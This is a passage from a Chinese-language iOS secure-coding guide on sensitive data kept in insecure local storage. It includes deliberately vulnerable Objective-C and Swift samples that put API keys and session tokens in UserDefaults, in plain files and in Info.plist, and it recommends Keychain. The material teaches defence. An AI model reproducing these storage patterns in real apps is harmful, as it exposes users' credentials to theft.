        (id)kSecAttrAccessible: (id)kSecAttrAccessibleWhenUnlocked
    };
    
    OSStatus status = SecItemAdd((CFDictionaryRef)query, NULL);
    // 检查 status 是否成功
}
```

通过读取沙盒文件，攻击者可以直接获取明文密码或Token，绕过应用的登录机制，实现对用户账户的未授权访问。这种漏洞的危害性极高，因为它将应用的安全性完全寄托于沙盒的完整性，而沙盒在越狱环境下或通过其他漏洞（如沙盒逃逸）很容易被绕过。

#### 易出现漏洞的代码模式

此类漏洞的根本原因在于开发者错误地使用了不安全的本地存储机制（如 `UserDefaults`、`NSFileManager`、`CoreData` 或 SQLite 数据库）来保存敏感信息，而不是使用iOS提供的安全存储机制 **Keychain**。

**易受攻击的代码模式（Objective-C/Swift）：**

1.  **使用 `UserDefaults` 存储敏感数据：**
    `UserDefaults` 存储的数据最终以明文形式保存在应用沙盒的 `.plist` 文件中，极易被提取。

    **Objective-C 示例：**
    ```objectivec
    // 错误：将服务器地址和端口明文存储
    [[NSUserDefaults standardUserDefaults] setObject:@"192.168.1.100" forKey:@"serverIP"];
    [[NSUserDefaults standardUserDefaults] setInteger:8080 forKey:@"serverPort"];
    [[NSUserDefaults standardUserDefaults] synchronize];
    ```

    **Swift 示例：**
    ```swift
    // 错误：将API Key明文存储
    let apiKey = "hardcoded_or_fetched_api_key_12345"
    UserDefaults.standard.set(apiKey, forKey: "API_KEY")
    ```

2.  **直接写入文件系统存储敏感数据：**
    将敏感数据直接写入应用沙盒的 `Documents` 或 `Library/Caches` 目录下的文件。

    **Objective-C 示例：**
    ```objectivec
    // 错误：将会话Token写入 Documents 目录下的文件
    NSString *token = @"session_token_xyz";
    NSString *filePath = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject stringByAppendingPathComponent:@"session.dat"];
    [token writeToFile:filePath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    ```

**Info.plist 配置模式：**

此类漏洞通常与 `Info.plist` 配置无关，而是与应用运行时的数据存储逻辑有关。然而，如果应用在 `Info.plist` 中硬编码了敏感信息（例如，某些第三方SDK的密钥），也会构成类似的安全风险。

**Info.plist 示例（硬编码敏感信息）：**
```xml
<key>ThirdPartyAPIKey</key>
<string>AIzaSyB-...</string>  <!-- 敏感信息硬编码 -->
<key>ServerBaseURL</key>
<string>https://prod.internal.com/api/</string>
```

**Entitlements 配置模式：**

如果应用使用了 App Group 或 iCloud 存储，并在 `Entitlements` 文件中配置了相应的权限，但未对共享或同步的数据进行加密，也会导致敏感数据泄露。

**Entitlements 示例（App Group 共享存储）：**
```xml
<key>com.apple.security.application-groups</key>
<array>
    <string>group.com.yourcompany.shared</string>
</array>
```
如果应用将敏感数据存储在共享容器中，且未加密，则所有属于该 App Group 的应用都可以访问，增加了攻击面。正确的做法是使用 Keychain Access Group 来安全地共享凭证。

---



